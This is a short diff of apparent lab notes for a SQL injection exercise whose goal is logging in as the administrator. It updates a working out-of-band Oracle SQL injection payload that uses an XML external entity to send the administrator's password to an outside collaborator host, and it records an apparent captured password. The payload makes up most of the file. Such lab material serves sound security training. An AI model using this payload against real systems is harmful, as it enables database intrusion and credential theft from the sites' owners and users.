@@ -11,9 +11,10 @@ End Goals:
 2) Login as the administrator user
 
 Analysis:
-akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net
+zqt8s4wgkhc1uzt008jdkxnpyg47sxgm.oastify.com
 
 
-' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.zqt8s4wgkhc1uzt008jdkxnpyg47sxgm.oastify.com/"> %remote;]>'),'/l') FROM dual)-- 
 
-0fpkzao19uq428v3bbde
+6ix6rksedtrko9ukgy3k
+
